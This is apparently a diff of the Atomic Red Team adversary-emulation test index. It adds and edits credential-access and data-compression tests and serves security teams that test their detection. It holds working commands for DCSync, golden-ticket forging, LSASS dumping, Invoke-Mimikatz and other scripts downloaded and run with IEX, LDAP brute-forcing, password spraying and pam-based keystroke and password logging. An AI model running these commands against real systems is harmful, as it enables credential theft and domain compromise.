+          systemctl stop #{systemd_timer_name}
+          systemctl disable #{systemd_timer_name}
+          rm #{path_to_systemd_service}
+          rm #{path_to_systemd_timer}
+          systemctl daemon-reload
+        name: bash
   T1542.005:
     technique:
       external_references:
@@ -18336,7 +18691,7 @@ credential-access:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1110.004:
@@ -18590,6 +18945,7 @@ credential-access:
         prereq_command: |
           try {
             New-Object -COMObject "word.Application" | Out-Null
+            $process = "winword"
             Stop-Process -Name $process
             exit 0
           } catch { exit 1 }
@@ -18599,7 +18955,7 @@ credential-access:
 '
       executor:
         command: |
-          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
         cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
           Ignore
@@ -18938,7 +19294,50 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1003.006
+    atomic_tests:
+    - name: DCSync
+      auto_generated_guid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
+      description: |
+        Attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
+        Works against a remote Windows Domain Controller using the replication protocol.
+        Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
+        [Reference](https://adsecurity.org/?p=1729)
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Targeted domain
+          type: string
+          default: example.com
+        user:
+          description: Targeted user
+          type: string
+          default: krbtgt
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: '#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"
+          "exit"'
   T1556.001:
     technique:
       external_references:
@@ -19316,7 +19715,82 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1558.001
+    atomic_tests:
+    - name: Crafting golden tickets with mimikatz
+      auto_generated_guid: 9726592a-dabc-4d4d-81cd-44070008b3af
+      description: |
+        Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.
+        This test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).
+        The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain_sid:
+          description: SID of the targeted domain, if you keep default it will automatically
+            get the current domain SID
+          type: string
+          default: S-1-5-21-DEFAULT
+        domain:
+          description: Targeted domain FQDN
+          type: string
+          default: example.com
+        account:
+          description: Account to impersonate
+          type: string
+          default: goldenticketfakeuser
+        krbtgt_aes256_key:
+          description: Krbtgt AES256 key
+          type: string
+          default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
+        mimikatz_path:
+          description: Mimikatz windows executable
+          type: path
+          default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
+
+'
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item
+          $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if
+          default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match
+          \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n
+          \ $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID
+          = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n
+          \ $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n#
+          create batch file with commands to run in a separate \"runas /netonly\"
+          session\n# so we don't purge Kerberos ticket from the current Windows session\n#
+          its output goes to golden.txt temp file, because we cannot capture \"runas
+          /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge
+          existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path}
+          \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key}
+          /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n
+          \ dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting
+          SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@
+          -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n#
+          run batch file in a new empty session (password and username do not matter)\necho
+          \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n#
+          wait until the output file has logged the entire attack\ndo {\n  Start-Sleep
+          1 # wait a bit so the output file has time to be created\n  Get-Content
+          -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match
+          'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy
+          loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content
+          $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat
+          -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
   T1552.006:
     technique:
       external_references:
@@ -19623,7 +20097,7 @@ credential-access:
       - windows
       executor:
         command: |
-          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
+          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
   T1555.001:
@@ -19793,6 +20267,40 @@ credential-access:
 
 '
         name: powershell
+        elevation_required: true
+    - name: Living off the land Terminal Input Capture on Linux with pam.d
+      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
+      description: "Pluggable Access Module, which is present on all modern Linux
+        systems, generally contains a library called pam_tty_audit.so which logs all
+        keystrokes for the selected users and sends it to audit.log.  All terminal
+        activity on any new logins would then be archived and readable by an adversary
+        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
+        with 'log_passwd' as in this example.  If root logging is enabled, then output
+        from any process which is later started by root is also logged, even if this
+        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
+        'aureport --tty' or other audit.d reading tools to read the log output, which
+        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
+        \n"
+      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
+        recompile, for this test to work"
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        command: if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth
+          /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then
+          sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk
+          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/system-auth
+        cleanup_command: |
+          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
+          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
+        name: sh
         elevation_required: true
   T1557.001:
     technique:
@@ -20104,7 +20612,7 @@ credential-access:
 '
         get_prereq_command: |
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
             Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
@@ -20253,8 +20761,15 @@ credential-access:
 
 '
         get_prereq_command: |
+          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
+          $request = [System.Net.WebRequest]::Create($url)
+          $response = $request.GetResponse()
+          $realTagUrl = $response.ResponseUri.OriginalString
+          $version = $realTagUrl.split('/')[-1]
+          $fileName = 'mimikatz_trunk.zip'
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
+          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -20285,33 +20800,33 @@ credential-access:
         Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
       supported_platforms:
       - windows
-      dependency_executor_name: powershell
+      dependency_executor_name: command_prompt
       dependencies:
       - description: 'Computer must have python 3 installed
 
 '
-        prereq_command: 'if (python --version) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "Python 3 must be installed manually"
 
 '
       - description: 'Computer must have pip installed
 
 '
-        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 -m pip --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "PIP must be installed manually"
 
 '
       - description: 'pypykatz must be installed and part of PATH
 
 '
-        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: 'pip3 install pypykatz
+        prereq_command: |
+          pypykatz -h >nul 2>&1
+          exit /b %errorlevel%
+        get_prereq_command: 'pip install pypykatz
 
 '
       executor:
@@ -20319,6 +20834,127 @@ credential-access:
 
 '
         name: command_prompt
+        elevation_required: true
+    - name: Dump LSASS.exe Memory using Out-Minidump.ps1
+      auto_generated_guid: 6502c8f0-b775-4dbd-9193-1298f56b6781
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
+        powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+        Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'');
+          get-process lsass | Out-Minidump
+
+'
+        cleanup_command: 'Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: true
+    - name: Create Mini Dump of LSASS.exe using ProcDump
+      auto_generated_guid: 7cede33f-0acd-44ef-9774-15511300b24b
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+        ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe
+
+        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+        If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\lsass_dump.dmp
+        procdump_exe:
+          description: Path of Procdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'ProcDump tool from Sysinternals must exist on disk at specified
+          location (#{procdump_exe})
+
+'
+        prereq_command: 'if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+      executor:
+        command: "#{procdump_exe} -accepteula -mm lsass.exe #{output_file}\n"
+        cleanup_command: 'del "#{output_file}" >nul 2> nul
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Powershell Mimikatz
+      auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
+      description: "Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script.\nIf Mimikatz runs successfully you will see several usernames
+        and hashes output to the screen.\nCommon failures include seeing an \\\"access
+        denied\\\" error which results when Anti-Virus blocks execution. \nOr, if
+        you try to run the test without the required administrative privleges you
+        will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_script:
+          description: URL to a remote Mimikatz script that dumps credentials
+          type: Url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+      executor:
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
+          Invoke-Mimikatz -DumpCreds
+
+'
+        name: powershell
+        elevation_required: true
+    - name: Dump LSASS with .Net 5 createdump.exe
+      auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
+      description: "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20)
+        from @bopin2020 in order to dump lsass\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\dotnet-lsass.dmp
+        createdump_exe:
+          description: Path of createdump.exe executable
+          type: Path
+          default: C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must have createdump.exe from .Net 5
+
+'
+        prereq_command: 'if (Test-Path ''#{createdump_exe}'') {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'echo ".NET 5 must be installed manually." "For the very
+          brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
+
+'
+      executor:
+        command: |
+          echo "Createdump Path #{createdump_exe}"
+          $LSASS = tasklist | findstr "lsass"
+          $FIELDS = $LSASS -split "\s+"
+          $ID = $FIELDS[1]
+          & "#{createdump_exe}" -u -f #{output_file} $ID
+        cleanup_command: 'del #{output_file}
+
+'
+        name: powershell
         elevation_required: true
   T1557:
     technique:
@@ -20891,11 +21527,19 @@ credential-access:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -20906,6 +21550,13 @@ credential-access:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -21042,28 +21693,6 @@ credential-access:
       x_mitre_version: '2.0'
       identifier: T1003
     atomic_tests:
-    - name: Powershell Mimikatz
-      auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
-      description: "Dumps credentials from memory via Powershell by invoking a remote
-        mimikatz script.\nIf Mimikatz runs successfully you will see several usernames
-        and hashes output to the screen.\nCommon failures include seeing an \\\"access
-        denied\\\" error which results when Anti-Virus blocks execution. \nOr, if
-        you try to run the test without the required administrative privleges you
-        will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
-      supported_platforms:
-      - windows
-      input_arguments:
-        remote_script:
-          description: URL to a remote Mimikatz script that dumps credentials
-          type: Url
-          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
-      executor:
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
-          Invoke-Mimikatz -DumpCreds
-
-'
-        name: powershell
-        elevation_required: true
     - name: Gsecdump
       auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
       description: "Dump credentials from memory using Gsecdump.\n\nUpon successful
@@ -21413,7 +22042,7 @@ credential-access:
       - SaaS
       identifier: T1110.001
     atomic_tests:
-    - name: Brute Force Credentials
+    - name: Brute Force Credentials of all domain users via SMB
       auto_generated_guid: '09480053-2f98-4854-be6e-71ae5f672224'
       description: 'Creates username and password files then attempts to brute force
         on remote host
@@ -21448,6 +22077,58 @@ credential-access:
           echo "1q2w3e4r" >> #{input_file_passwords}
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
+    - name: Brute Force Credentials of single domain user via LDAP against domain
+        controller (NTLM or Kerberos)
+      auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
+      description: 'Attempt to brute force domain user on a domain controller, via
+        LDAP, with NTLM or Kerberos
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        user:
+          description: Account to bruteforce
+          type: String
+          default: bruce.wayne
+        passwords:
+          description: List of passwords we will attempt to brute force with
+          type: String
+          default: Password1`n1q2w3e4r`nPassword!
+        domain:
+          description: Domain FQDN
+          type: String
+          default: contoso.com
+        auth:
+          description: authentication method to choose between "NTLM" and "Kerberos"
+          type: string
+          default: NTLM
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
+            Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+            exit 1
+          }
+
+          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+          $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
+
+          $passwords = "#{passwords}".split("{`n}")
+          foreach ($password in $passwords){
+            $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")
+            $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
+            try {
+              Write-Host " [-] Attempting ${password} on account #{user}."
+              $conn.bind()
+              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+              Write-Host " [!] #{user}:${password} are valid credentials!"
+            } catch {
+              Write-Host $_.Exception.Message
+            }
+          }
+          Write-Host "End of bruteforce"
   T1110.003:
     technique:
       id: attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c
@@ -21537,7 +22218,7 @@ credential-access:
         CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
         This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
         Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
-        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
+        See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5
       supported_platforms:
       - windows
       input_arguments:
@@ -21579,10 +22260,64 @@ credential-access:
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'');
-          Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1''
+          -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain
+          #{domain} -Force
 
 '
+    - name: Password spray all domain users with a single password via LDAP against
+        domain controller (NTLM or Kerberos)
+      auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d
+      description: |
+        Attempt to brute force all domain user with a single password (called "password spraying") on a domain controller, via LDAP, with NTLM or Kerberos
+
+        Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)
+      supported_platforms:
+      - windows
+      input_arguments:
+        password:
+          description: single password we will attempt to auth with (if you need several
+            passwords, then it is a bruteforce so see T1110.001)
+          type: String
+          default: P@ssw0rd!
+        domain:
+          description: Domain FQDN
+          type: String
+          default: contoso.com
+        auth:
+          description: authentication method to choose between "NTLM" and "Kerberos"
+          type: string
+          default: NTLM
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {
+            Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"
+            exit 1
+          }
+
+          $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName
+
+          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
+          $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)
+
+          $DomainUsers | Foreach-Object {
+            $user = $_
+            $password = "#{password}"
+
+            $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")
+            $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
+            try {
+              Write-Host " [-] Attempting ${password} on account ${user}."
+              $conn.bind()
+              # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+              Write-Host " [!] ${user}:${password} are valid credentials!"
+            } catch {
+              Write-Host $_.Exception.Message
+            }
+          }
+          Write-Host "End of password spraying"
   T1556.003:
     technique:
       external_references:
@@ -21923,33 +22658,33 @@ credential-access:
 '
       supported_platforms:
       - windows
-      dependency_executor_name: powershell
+      dependency_executor_name: command_prompt
       dependencies:
       - description: 'Computer must have python 3 installed
 
 '
-        prereq_command: 'if (python --version) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "Python 3 must be installed manually"
 
 '
       - description: 'Computer must have pip installed
 
 '
-        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
-
-'
+        prereq_command: |
+          py -3 -m pip --version >nul 2>&1
+          exit /b %errorlevel%
         get_prereq_command: 'echo "PIP must be installed manually"
 
 '
       - description: 'pypykatz must be installed and part of PATH
 
 '
-        prereq_command: 'if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: 'pip3 install pypykatz
+        prereq_command: |
+          pypykatz -h >nul 2>&1
+          exit /b %errorlevel%
+        get_prereq_command: 'pip install pypykatz
 
 '
       executor:
@@ -21984,7 +22719,9 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
-        cleanup_command: del
+        cleanup_command: 'del #{copy_dest}\#{file_name} >nul 2>&1
+
+'
     - name: PowerDump Registry dump of SAM for hashes and usernames
       auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
       description: Executes a hashdump by reading the hasshes from the registry.
@@ -22839,8 +23576,7 @@ collection:
         get_prereq_command: |
           echo Downloading Winrar installer
           bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
-          echo Follow the installer prompts to install Winrar
-          #{rar_installer}
+          #{rar_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -22857,6 +23593,26 @@ collection:
         rar a -p"blue" hello.rar (VARIANT)
       supported_platforms:
       - windows
+      input_arguments:
+        rar_installer:
+          description: Winrar installer
+          type: Path
+          default: "%TEMP%\\winrar.exe"
+        rar_exe:
+          description: The RAR executable from Winrar
+          type: Path
+          default: "%programfiles%/WinRAR/Rar.exe"
+      dependencies:
+      - description: 'Rar tool must be installed at specified location (#{rar_exe})
+
+'
+        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading Winrar installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
+          #{rar_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -22864,7 +23620,7 @@ collection:
           mkdir .\tmp\victim-files
           cd .\tmp\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          rar a -hp"blue" hello.rar
+          "#{rar_exe}" a -hp"blue" hello.rar
           dir
     - name: Compress Data and lock with password for Exfiltration with winzip
       auto_generated_guid: 01df0353-d531-408d-a0c5-3161bf822134
@@ -22917,6 +23673,26 @@ collection:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        7zip_installer:
+          description: 7zip installer
+          type: Path
+          default: "%TEMP%\\7zip.exe"
+        7zip_exe:
+          description: Path to installed 7zip executable
+          type: Path
+          default: "%ProgramFiles%\\7-zip\\7z.exe"
+      dependencies:
+      - description: '7zip tool must be installed at specified location (#{7zip_exe})
+
+'
+        prereq_command: 'if not exist "#{7zip_exe}" (exit /b 1)
+
+'
+        get_prereq_command: |
+          echo Downloading 7-zip installer
+          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2002-x64.exe" #{7zip_installer}
+          #{7zip_installer} /S
       executor:
         name: command_prompt
         elevation_required: false
@@ -22924,7 +23700,7 @@ collection:
           mkdir $PathToAtomicsFolder\T1560.001\victim-files
           cd $PathToAtomicsFolder\T1560.001\victim-files
           echo "This file will be encrypted" > .\encrypted_file.txt
-          7z a archive.7z -pblue
+          "#{7zip_exe}" u archive.7z *txt -pblue
           dir
     - name: Data Compressed - nix - zip
       auto_generated_guid: c51cec55-28dd-4ad2-9461-1eacbc82c3a0
@@ -23073,7 +23849,9 @@ collection:
           zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*
           echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
           ls -l #{test_folder}
-        cleanup_command: 'rm -Rf #{test_folder}'
